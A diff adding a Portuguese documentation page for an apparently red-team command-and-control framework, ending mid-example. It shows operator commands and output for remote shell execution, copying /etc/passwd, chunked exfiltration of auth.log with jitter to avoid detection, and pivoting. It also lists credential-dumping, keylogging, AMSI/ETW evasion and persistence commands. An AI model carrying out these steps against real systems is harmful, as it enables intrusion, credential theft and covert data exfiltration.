+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/credential-access/">
+<span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_4_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Credential Access
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/lsass-dumping/">
+<span class="md-ellipsis">
+    
+  
+    LSASS Dumping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/registry-hives/">
+<span class="md-ellipsis">
+    
+  
+    Registry Hives
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/kerberoasting/">
+<span class="md-ellipsis">
+    
+  
+    Kerberoasting
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/vault-extraction/">
+<span class="md-ellipsis">
+    
+  
+    Vault Extraction
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/persistence/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_5_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Persistence
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/windows-registry/">
+<span class="md-ellipsis">
+    
+  
+    Windows Registry
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/scheduled-tasks/">
+<span class="md-ellipsis">
+    
+  
+    Scheduled Tasks
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/linux-cron/">
+<span class="md-ellipsis">
+    
+  
+    Linux Cron
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/macos-launchd/">
+<span class="md-ellipsis">
+    
+  
+    macOS Launchd
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_6_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Lateral Movement
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/port-forwarding/">
+<span class="md-ellipsis">
+    
+  
+    Port Forwarding
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/socks-proxy/">
+<span class="md-ellipsis">
+    
+  
+    SOCKS Proxy
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/pivot-chains/">
+<span class="md-ellipsis">
+    
+  
+    Pivot Chains
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/remote-execution/">
+<span class="md-ellipsis">
+    
+  
+    Remote Execution
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_7" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../modules/">
+<span class="md-ellipsis">
+    
+  
+    Module Catalog
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_7">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Module Catalog
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/shell/">
+<span class="md-ellipsis">
+    
+  
+    Shell
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/fileops/">
+<span class="md-ellipsis">
+    
+  
+    File Operations
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/recon/">
+<span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/persist/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/lateral/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/credential/">
+<span class="md-ellipsis">
+    
+  
+    Credentials
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/exfil/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_8" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../api/">
+<span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_8_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_8">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    API Reference
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="primeira-operacao">Primeira Operacao<a class="headerlink" href="#primeira-operacao" title="Permanent link">¶</a></h1>
+<p>Com o agent registrado e ativo, voce esta pronto para executar operacoes. Este guia cobre os comandos essenciais: execucao de modulos, visualizacao de resultados, operacoes com arquivos e exfiltracao. Certifique-se de que completou o <a href="../first-implant/">Primeiro Implant</a> antes de prosseguir.</p>
+<h2 id="1-selecionar-o-agent">1. Selecionar o Agent<a class="headerlink" href="#1-selecionar-o-agent" title="Permanent link">¶</a></h2>
+<p>No REPL do client, use o comando <code>use</code> com o ID do agent (ou um prefixo unico):</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a>wolfgang &gt;&gt; agents
+<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a>ID        HOSTNAME     OS     USER    LAST SEEN            TRANSPORT  STATUS
+<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a>a1b2c3d4  target-vm    linux  root    2026-03-14 10:15:00  https      active
+<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a>
+<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a>wolfgang &gt;&gt; use a1b2
+<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a>wolfgang [a1b2c3d4] &gt;&gt;
+</code></pre></div>
+<p>O prompt muda para indicar que voce esta no <strong>contexto do agent</strong>. Todos os comandos subsequentes sao direcionados a este agent. Use <code>back</code> para retornar ao contexto root.</p>
+<div class="admonition tip">
+<p class="admonition-title">Resolucao de ID</p>
+<p>Voce nao precisa digitar o ID completo. O client resolve prefixos unicos automaticamente. Se o prefixo for ambiguo (match em multiplos agents), ele avisa.</p>
+</div>
+<h3 id="comandos-disponiveis-no-contexto-do-agent">Comandos disponiveis no contexto do agent<a class="headerlink" href="#comandos-disponiveis-no-contexto-do-agent" title="Permanent link">¶</a></h3>
+<p>O contexto do agent disponibiliza um conjunto completo de operacoes:</p>
+<table>
+<thead>
+<tr>
+<th>Categoria</th>
+<th>Comandos</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Navegacao</strong></td>
+<td><code>back</code>, <code>info</code>, <code>tasks</code>, <code>help</code></td>
+</tr>
+<tr>
+<td><strong>Execucao</strong></td>
+<td><code>shell</code>, <code>exec &lt;cmd&gt;</code>, <code>run &lt;module&gt; [args]</code></td>
+</tr>
+<tr>
+<td><strong>Arquivos</strong></td>
+<td><code>upload &lt;local&gt; &lt;remote&gt;</code>, <code>download &lt;remote&gt; &lt;local&gt;</code></td>
+</tr>
+<tr>
+<td><strong>Exfiltracao</strong></td>
+<td><code>exfil &lt;path&gt;</code>, <code>exfils</code>, <code>exfils download &lt;id&gt; &lt;path&gt;</code></td>
+</tr>
+<tr>
+<td><strong>Reconnaissance</strong></td>
+<td><code>sysinfo</code>, <code>osversion</code>, <code>screenshot</code>, <code>keylog</code></td>
+</tr>
+<tr>
+<td><strong>Credentials</strong></td>
+<td><code>creds lsass</code>, <code>creds kerberoast</code>, <code>creds hive</code>, <code>creds vault</code></td>
+</tr>
+<tr>
+<td><strong>Lateral Movement</strong></td>
+<td><code>rexec</code>, <code>pivot</code>, <code>portfwd</code>, <code>socks</code></td>
+</tr>
+<tr>
+<td><strong>Evasion</strong></td>
+<td><code>evasion amsi</code>, <code>evasion etw</code>, <code>evasion unhook</code>, <code>evasion inject</code></td>
+</tr>
+<tr>
+<td><strong>Persistence</strong></td>
+<td><code>persist &lt;method&gt; &lt;path&gt;</code>, <code>cleanup</code>, <code>selfdestruct</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-executar-modulos">2. Executar Modulos<a class="headerlink" href="#2-executar-modulos" title="Permanent link">¶</a></h2>
+<h3 id="comando-unico-exec">Comando unico: <code>exec</code><a class="headerlink" href="#comando-unico-exec" title="Permanent link">¶</a></h3>
+<p>Execute um comando no alvo e aguarde o resultado:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a>wolfgang [a1b2c3d4] &gt;&gt; exec whoami
+<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a>[*] Task queued: b2c3d4e5 (module=shell.exec)
+<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a>[+] Task completed:
+<a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a>root
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a>wolfgang [a1b2c3d4] &gt;&gt; exec cat /etc/hostname
+<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a>[*] Task queued: c3d4e5f6 (module=shell.exec)
+<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a>[+] Task completed:
+<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a>target-vm
+</code></pre></div>
+<h3 id="shell-interativo-shell">Shell interativo: <code>shell</code><a class="headerlink" href="#shell-interativo-shell" title="Permanent link">¶</a></h3>
+<p>Para multiplos comandos em sequencia, abra uma sessao shell interativa:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a>wolfgang [a1b2c3d4] &gt;&gt; shell
+<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a>[*] Interactive shell on agent a1b2c3d4 (type 'exit' to return)
+<a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a>shell&gt; id
+<a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a>[*] Task queued: d4e5f6a7 (module=shell.exec)
+<a href="#__codelineno-3-5" id="__codelineno-3-5" name="__codelineno-3-5"></a>[+] Task completed:
+<a href="#__codelineno-3-6" id="__codelineno-3-6" name="__codelineno-3-6"></a>uid=0(root) gid=0(root) groups=0(root)
+<a href="#__codelineno-3-7" id="__codelineno-3-7" name="__codelineno-3-7"></a>
+<a href="#__codelineno-3-8" id="__codelineno-3-8" name="__codelineno-3-8"></a>shell&gt; uname -a
+<a href="#__codelineno-3-9" id="__codelineno-3-9" name="__codelineno-3-9"></a>[*] Task queued: e5f6a7b8 (module=shell.exec)
+<a href="#__codelineno-3-10" id="__codelineno-3-10" name="__codelineno-3-10"></a>[+] Task completed:
+<a href="#__codelineno-3-11" id="__codelineno-3-11" name="__codelineno-3-11"></a>Linux target-vm 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
+<a href="#__codelineno-3-12" id="__codelineno-3-12" name="__codelineno-3-12"></a>
+<a href="#__codelineno-3-13" id="__codelineno-3-13" name="__codelineno-3-13"></a>shell&gt; exit
+<a href="#__codelineno-3-14" id="__codelineno-3-14" name="__codelineno-3-14"></a>[*] Shell session closed.
+</code></pre></div>
+<p>Cada comando no shell e enviado como uma task separada. O client aguarda o resultado antes de mostrar o proximo prompt.</p>
+<h3 id="reconnaissance-sysinfo">Reconnaissance: <code>sysinfo</code><a class="headerlink" href="#reconnaissance-sysinfo" title="Permanent link">¶</a></h3>
+<p>Coleta informacoes completas do sistema:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a>wolfgang [a1b2c3d4] &gt;&gt; sysinfo
+<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a>[*] Task queued: f6a7b8c9 (module=recon.sysinfo)
+<a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a>[+] Task completed:
+<a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a>{
+<a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a>  "hostname": "target-vm",
+<a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a>  "os": "linux",
+<a href="#__codelineno-4-7" id="__codelineno-4-7" name="__codelineno-4-7"></a>  "arch": "amd64",
+<a href="#__codelineno-4-8" id="__codelineno-4-8" name="__codelineno-4-8"></a>  "kernel": "5.15.0-91-generic",
+<a href="#__codelineno-4-9" id="__codelineno-4-9" name="__codelineno-4-9"></a>  "username": "root",
+<a href="#__codelineno-4-10" id="__codelineno-4-10" name="__codelineno-4-10"></a>  "pid": 1234,
+<a href="#__codelineno-4-11" id="__codelineno-4-11" name="__codelineno-4-11"></a>  "internal_ips": ["192.168.1.100"],
+<a href="#__codelineno-4-12" id="__codelineno-4-12" name="__codelineno-4-12"></a>  "external_ip": "203.0.113.50"
+<a href="#__codelineno-4-13" id="__codelineno-4-13" name="__codelineno-4-13"></a>}
+</code></pre></div>
+<h3 id="modulo-generico-run">Modulo generico: <code>run</code><a class="headerlink" href="#modulo-generico-run" title="Permanent link">¶</a></h3>
+<p>O comando <code>run</code> permite executar qualquer modulo registrado pelo nome:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a>wolfgang [a1b2c3d4] &gt;&gt; run recon.sysinfo {}
+<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a>[*] Running module recon.sysinfo...
+<a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a>[*] Task queued: a7b8c9d0 (module=recon.sysinfo)
+<a href="#__codelineno-5-4" id="__codelineno-5-4" name="__codelineno-5-4"></a>[+] Task completed:
+<a href="#__codelineno-5-5" id="__codelineno-5-5" name="__codelineno-5-5"></a>...
+<a href="#__codelineno-5-6" id="__codelineno-5-6" name="__codelineno-5-6"></a>
+<a href="#__codelineno-5-7" id="__codelineno-5-7" name="__codelineno-5-7"></a>wolfgang [a1b2c3d4] &gt;&gt; run recon.osversion {}
+<a href="#__codelineno-5-8" id="__codelineno-5-8" name="__codelineno-5-8"></a>[*] Running module recon.osversion...
+<a href="#__codelineno-5-9" id="__codelineno-5-9" name="__codelineno-5-9"></a>[*] Task queued: b8c9d0e1 (module=recon.osversion)
+<a href="#__codelineno-5-10" id="__codelineno-5-10" name="__codelineno-5-10"></a>[+] Task completed:
+<a href="#__codelineno-5-11" id="__codelineno-5-11" name="__codelineno-5-11"></a>...
+</code></pre></div>
+<p>Isso e util para modulos sem comando dedicado ou para modulos dinamicos carregados em runtime.</p>
+<h2 id="3-ciclo-de-vida-de-uma-task">3. Ciclo de Vida de uma Task<a class="headerlink" href="#3-ciclo-de-vida-de-uma-task" title="Permanent link">¶</a></h2>
+<p>Cada operacao no Wolfgang segue um ciclo de vida bem definido. Entender esse fluxo e essencial para diagnosticar problemas:</p>
+<pre class="mermaid"><code>sequenceDiagram
+    participant OP as Operador
+    participant SRV as Teamserver
+    participant AGT as Agent
+
+    OP-&gt;&gt;SRV: POST /agents/{id}/tasks<br/>(module + args)
+    Note over SRV: Task criada com status "pending"
+    SRV-&gt;&gt;OP: task_id
+
+    Note over AGT: Proximo check-in (sleep + jitter)
+    AGT-&gt;&gt;SRV: GET /checkin<br/>(agent_id, envelope criptografado)
+    Note over SRV: Task status -&gt; "running"
+    SRV-&gt;&gt;AGT: Task(s) pendentes no payload
+
+    Note over AGT: Modulo executa no alvo
+    AGT-&gt;&gt;SRV: POST /checkin<br/>(task_result, envelope criptografado)
+    Note over SRV: Task status -&gt; "completed"
+
+    Note over OP: Polling ou WebSocket event
+    OP-&gt;&gt;SRV: GET /tasks/{task_id}
+    SRV-&gt;&gt;OP: Resultado da task
+</code></pre>
+<h3 id="estados-de-uma-task">Estados de uma task<a class="headerlink" href="#estados-de-uma-task" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Status</th>
+<th>Descricao</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>pending</code></td>
+<td>Task criada, aguardando proximo check-in do agent</td>
+</tr>
+<tr>
+<td><code>running</code></td>
+<td>Task despachada ao agent no check-in</td>
+</tr>
+<tr>
+<td><code>completed</code></td>
+<td>Resultado recebido com sucesso</td>
+</tr>
+<tr>
+<td><code>failed</code></td>
+<td>Execucao do modulo retornou erro</td>
+</tr>
+<tr>
+<td><code>expired</code></td>
+<td>TTL excedido (1 hora) sem que o agent fizesse check-in</td>
+</tr>
+<tr>
+<td><code>cancelled</code></td>
+<td>Cancelada pelo operador via <code>cancel</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="timing-e-latencia">Timing e latencia<a class="headerlink" href="#timing-e-latencia" title="Permanent link">¶</a></h3>
+<p>O tempo entre enviar uma task e receber o resultado depende do intervalo de check-in do agent:</p>
+<ul>
+<li><strong>Sleep 5000ms + Jitter 10%</strong>: resultado em ~5-5.5 segundos</li>
+<li><strong>Sleep 60s + Jitter 10%</strong>: resultado em ate ~66 segundos</li>
+<li>O client faz polling a cada 2 segundos ate timeout de 5 minutos</li>
+</ul>
+<p>Se o WebSocket estiver conectado, voce recebe notificacoes push de eventos (novo agent, task completada, etc.) sem depender de polling.</p>
+<h3 id="listar-tasks-do-agent">Listar tasks do agent<a class="headerlink" href="#listar-tasks-do-agent" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a>wolfgang [a1b2c3d4] &gt;&gt; tasks
+<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a>ID        MODULE       STATUS     CREATED
+<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a>b2c3d4e5  shell.exec   completed  2026-03-14 10:16:00
+<a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a>c3d4e5f6  shell.exec   completed  2026-03-14 10:16:05
+<a href="#__codelineno-6-5" id="__codelineno-6-5" name="__codelineno-6-5"></a>d4e5f6a7  shell.exec   completed  2026-03-14 10:17:00
+<a href="#__codelineno-6-6" id="__codelineno-6-6" name="__codelineno-6-6"></a>f6a7b8c9  recon.sysinfo completed 2026-03-14 10:18:00
+</code></pre></div>
+<h2 id="4-operacoes-com-arquivos">4. Operacoes com Arquivos<a class="headerlink" href="#4-operacoes-com-arquivos" title="Permanent link">¶</a></h2>
+<h3 id="upload-operador-alvo">Upload: operador -&gt; alvo<a class="headerlink" href="#upload-operador-alvo" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a>wolfgang [a1b2c3d4] &gt;&gt; upload /tmp/tool.sh /tmp/tool.sh
+<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a>[*] Uploading /tmp/tool.sh (4096 bytes) -&gt; /tmp/tool.sh
+<a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a>[*] Task queued: c9d0e1f2 (module=fileops.upload)
+<a href="#__codelineno-7-4" id="__codelineno-7-4" name="__codelineno-7-4"></a>[+] Task completed:
+<a href="#__codelineno-7-5" id="__codelineno-7-5" name="__codelineno-7-5"></a>File written to /tmp/tool.sh
+</code></pre></div>
+<p>O conteudo do arquivo e codificado em base64 e enviado como argumento da task <code>fileops.upload</code>.</p>
+<h3 id="download-alvo-operador">Download: alvo -&gt; operador<a class="headerlink" href="#download-alvo-operador" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a>wolfgang [a1b2c3d4] &gt;&gt; download /etc/passwd ./passwd_copy
+<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a>[*] Downloading /etc/passwd -&gt; ./passwd_copy
+<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a>[*] Task queued: d0e1f2a3 (module=fileops.download)
+<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a>[+] Saved 2048 bytes -&gt; ./passwd_copy
+</code></pre></div>
+<p>O arquivo e recebido em base64 na resposta da task e decodificado localmente pelo client.</p>
+<h2 id="5-exfiltracao-de-dados">5. Exfiltracao de Dados<a class="headerlink" href="#5-exfiltracao-de-dados" title="Permanent link">¶</a></h2>
+<p>Para arquivos maiores ou operacoes que precisam de resiliencia, use a exfiltracao chunked:</p>
+<h3 id="iniciar-exfiltracao">Iniciar exfiltracao<a class="headerlink" href="#iniciar-exfiltracao" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a>wolfgang [a1b2c3d4] &gt;&gt; exfil /var/log/auth.log
+<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a>[*] Starting exfiltration of /var/log/auth.log...
+<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>[*] Task queued: e1f2a3b4 (module=exfil)
+<a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a>[+] Task completed:
+<a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a>Exfiltration started: session f2a3b4c5
+</code></pre></div>
+<p>A exfiltracao chunked divide o arquivo em pedacos, envia cada chunk separadamente (com jitter entre envios), e reassembla no servidor. Isso permite:</p>
+<ul>
+<li>Transferencia de arquivos grandes sem timeout</li>
+<li>Resiliencia a interrupcoes de conexao</li>
+<li>Jitter entre chunks para reduzir deteccao</li>
+</ul>
+<h3 id="monitorar-sessoes-de-exfiltracao">Monitorar sessoes de exfiltracao<a class="headerlink" href="#monitorar-sessoes-de-exfiltracao" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a>wolfgang [a1b2c3d4] &gt;&gt; exfils
+<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a>ID        FILE           SIZE      PROGRESS  STATUS       CREATED
+<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a>f2a3b4c5  auth.log       1048576   15/20     in_progress  2026-03-14 10:20:00
+</code></pre></div>
+<h3 id="download-do-arquivo-exfiltrado">Download do arquivo exfiltrado<a class="headerlink" href="#download-do-arquivo-exfiltrado" title="Permanent link">¶</a></h3>
+<p>Apos a conclusao (status <code>completed</code>), baixe o arquivo reassemblado:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a>wolfgang [a1b2c3d4] &gt;&gt; exfils download f2a3b4c5 ./auth.log
+<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a>[+] Exfil data saved: ./auth.log (1048576 bytes)
+</code></pre></div>
+<h3 id="parametros-opcionais-da-exfiltracao">Parametros opcionais da exfiltracao<a class="headerlink" href="#parametros-opcionais-da-exfiltracao" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a>exfil &lt;remote_path&gt; [chunk_size_bytes] [jitter_ms]
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Parametro</th>
+<th>Default</th>
+<th>Descricao</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>remote_path</code></td>
+<td>(obrigatorio)</td>
+<td>Caminho do arquivo no alvo</td>
+</tr>
+<tr>
+<td><code>chunk_size_bytes</code></td>
+<td>auto</td>
+<td>Tamanho de cada chunk em bytes</td>
+</tr>
+<tr>
+<td><code>jitter_ms</code></td>
+<td>auto</td>
+<td>Delay aleatorio entre chunks em milissegundos</td>
+</tr>
+</tbody>
+</table>
+<h2 id="6-outras-operacoes-uteis">6. Outras Operacoes Uteis<a class="headerlink" href="#6-outras-operacoes-uteis" title="Permanent link">¶</a></h2>
+<h3 id="screenshot">Screenshot<a class="headerlink" href="#screenshot" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a>wolfgang [a1b2c3d4] &gt;&gt; screenshot
+<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a>[*] Capturing screenshot...
+<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a>[*] Task queued: a3b4c5d6 (module=recon.screenshot)
+<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a>[+] Screenshot saved -&gt; screenshot-a3b4c5d6.png (245760 bytes)
+</code></pre></div>
+<h3 id="port-forwarding">Port forwarding<a class="headerlink" href="#port-forwarding" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a>wolfgang [a1b2c3d4] &gt;&gt; portfwd add 8080 192.168.1.200:80
+<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a>[*] Task queued: b4c5d6e7 (module=lateral.portfwd)
+<a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a>[+] Task completed:
+<a href="#__codelineno-14-4" id="__codelineno-14-4" name="__codelineno-14-4"></a>Port forward active: localhost:8080 -&gt; 192.168.1.200:80
+</code></pre></div>
+<h3 id="socks-proxy">SOCKS proxy<a class="headerlink" href="#socks-proxy" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a>wolfgang [a1b2c3d4] &gt;&gt; socks start 1080
+<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a>[*] Task queued: c5d6e7f8 (module=lateral.socks)
+<a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a>[+] Task completed:
